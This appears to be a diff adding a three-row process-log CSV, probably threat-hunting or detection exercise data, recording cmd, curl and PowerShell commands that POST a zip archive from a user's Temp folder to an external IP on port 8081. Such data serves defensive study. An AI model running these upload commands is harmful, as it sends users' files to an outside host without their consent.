@@ -1,0 +1,4 @@
+Timestamp,FileName,ProcessCommandLine,Destination
+2025-09-16 14:43:20,cmd.exe,"""cmd.exe"" /c curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload",185.92.220.87:8081
+2025-09-16 14:43:21,curl.exe,"curl -X POST -F ""file=@C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip"" http://185.92.220.87:8081/upload",185.92.220.87:8081
+2025-09-16 14:43:28,powershell.exe,"powershell -Command ""Invoke-WebRequest -Uri 'http://185.92.220.87:8081/api/upload' -Method POST -InFile 'C:\Users\SLFlare\AppData\Local\Temp\backup_sync.zip'""",185.92.220.87:8081
